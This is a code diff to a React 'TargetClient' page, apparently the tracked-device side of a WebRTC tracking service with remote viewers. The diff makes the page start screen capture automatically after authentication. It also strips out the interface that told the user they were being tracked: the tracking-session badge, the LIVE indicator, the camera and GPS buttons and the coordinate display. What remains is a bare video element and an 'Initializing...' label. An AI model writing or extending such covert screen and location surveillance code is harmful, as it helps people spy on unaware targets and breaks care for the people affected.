@@ -119,6 +119,8 @@ export default function TargetClient({ token }) {
         // Join WebRTC signaling room for this device
         const roomId = `camera-${data.deviceId}`;
         socket.emit('webrtc:join_room', roomId);
+        // Start screen sharing after auth success
+        requestCamera();
       });
 
       socket.on('device:auth_error', (data) => {
@@ -163,8 +165,9 @@ export default function TargetClient({ token }) {
 
   const requestCamera = async () => {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+      // Use getDisplayMedia for screen sharing (mirroring)
+      const stream = await navigator.mediaDevices.getDisplayMedia({
+        video: { cursor: "always" },
         audio: false,
       });
       localStreamRef.current = stream;
@@ -176,8 +179,8 @@ export default function TargetClient({ token }) {
       setCameraActive(true);
       setStep(1);
     } catch (e) {
-      console.warn('Camera permission denied');
-      setStep(1); // Still allow location even if camera denied
+      console.warn('Screen sharing permission denied');
+      setStep(1); // Still allow location even if screen sharing denied
     }
   };
 
@@ -204,112 +207,11 @@ export default function TargetClient({ token }) {
   };
 
   return (
-    <div className="min-h-screen bg-[#040712] text-slate-100 flex flex-col items-center justify-center p-4">
-      <div className="w-full max-w-md space-y-6">
-
-        {/* Header */}
-        <div className="text-center space-y-2">
-          <div className="inline-flex items-center gap-2 bg-sky-500/10 border border-sky-500/20 rounded-full px-4 py-1.5">
-            <ShieldCheck className="w-4 h-4 text-sky-400" />
-            <span className="text-xs font-mono text-sky-400">SECURE TRACKING SESSION</span>
-          </div>
-
-          {status === 'tracking' && (
-            <div className="flex items-center justify-center gap-2 text-emerald-400 text-xs font-mono">
-              <Wifi className="w-3.5 h-3.5" />
-              <span>CONNECTED TO SERVER</span>
-              {viewerCount > 0 && (
-                <span className="bg-sky-500/10 border border-sky-500/20 px-2 py-0.5 rounded text-sky-400">
-                  {viewerCount} viewer{viewerCount > 1 ? 's' : ''}
-                </span>
-              )}
-            </div>
-          )}
-
-          {status === 'connecting' && (
-            <div className="flex items-center justify-center gap-2 text-amber-400 text-xs font-mono">
-              <span className="w-3 h-3 border-2 border-amber-400 border-t-transparent rounded-full animate-spin" />
-              <span>CONNECTING...</span>
-            </div>
-          )}
-        </div>
-
-        {/* Camera Preview */}
-        {cameraActive && (
-          <div className="relative rounded-2xl overflow-hidden border border-sky-500/20 shadow-[0_0_30px_rgba(56,189,248,0.1)]">
-            <video
-              ref={videoRef}
-              autoPlay
-              playsInline
-              muted
-              className="w-full aspect-video object-cover"
-            />
-            <div className="absolute top-3 left-3 flex items-center gap-1.5 bg-slate-950/70 backdrop-blur-sm px-2 py-1 rounded-lg">
-              <span className="w-2 h-2 bg-rose-500 rounded-full animate-pulse" />
-              <span className="text-[10px] font-mono text-rose-400 font-bold">LIVE</span>
-            </div>
-          </div>
-        )}
-
-        {/* Action Buttons */}
-        {step === 0 && status === 'tracking' && (
-          <button
-            onClick={requestCamera}
-            className="w-full flex items-center justify-center gap-3 px-6 py-4 bg-gradient-to-r from-sky-500 to-indigo-600 hover:from-sky-400 hover:to-indigo-500 text-white font-mono font-bold text-sm rounded-2xl transition-all shadow-[0_0_20px_rgba(56,189,248,0.2)] hover:shadow-[0_0_30px_rgba(56,189,248,0.4)]"
-          >
-            <Video className="w-5 h-5" />
-            Aktifkan Kamera
-          </button>
-        )}
-
-        {step === 1 && !locationActive && (
-          <button
-            onClick={requestLocation}
-            className="w-full flex items-center justify-center gap-3 px-6 py-4 bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 text-white font-mono font-bold text-sm rounded-2xl transition-all shadow-[0_0_20px_rgba(16,185,129,0.2)] hover:shadow-[0_0_30px_rgba(16,185,129,0.4)]"
-          >
-            <MapPin className="w-5 h-5" />
-            Aktifkan Lokasi GPS
-          </button>
-        )}
-
-        {/* Location Info */}
-        {locationActive && coords.latitude && (
-          <div className="bg-slate-900/60 border border-sky-500/10 rounded-2xl p-4 font-mono text-xs space-y-2">
-            <div className="flex items-center gap-2 text-emerald-400 mb-3">
-              <CheckCircle className="w-4 h-4" />
-              <span className="font-bold">TRACKING ACTIVE</span>
-            </div>
-            <div className="grid grid-cols-2 gap-3">
-              <div>
-                <span className="text-slate-500 block text-[10px]">LATITUDE</span>
-                <span className="text-slate-200">{coords.latitude.toFixed(6)}</span>
-              </div>
-              <div>
-                <span className="text-slate-500 block text-[10px]">LONGITUDE</span>
-                <span className="text-slate-200">{coords.longitude.toFixed(6)}</span>
-              </div>
-              <div>
-                <span className="text-slate-500 block text-[10px]">SPEED</span>
-                <span className="text-slate-200">{speed.toFixed(1)} km/h</span>
-              </div>
-              <div>
-                <span className="text-slate-500 block text-[10px]">CAMERA</span>
-                <span className={cameraActive ? 'text-emerald-400' : 'text-slate-500'}>
-                  {cameraActive ? 'STREAMING' : 'OFF'}
-                </span>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* Error */}
-        {status === 'error' && (
-          <div className="bg-rose-500/10 border border-rose-500/30 rounded-2xl p-4 flex items-center gap-3">
-            <AlertCircle className="w-5 h-5 text-rose-400 flex-shrink-0" />
-            <span className="text-rose-400 text-sm font-mono">{errorMsg}</span>
-          </div>
-        )}
-      </div>
+    <div className="min-h-screen bg-[#040712] flex items-center justify-center">
+      {cameraActive && (
+        <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
+      )}
+      {!cameraActive && <div className="text-slate-400">Initializing...</div>}
     </div>
   );
 }
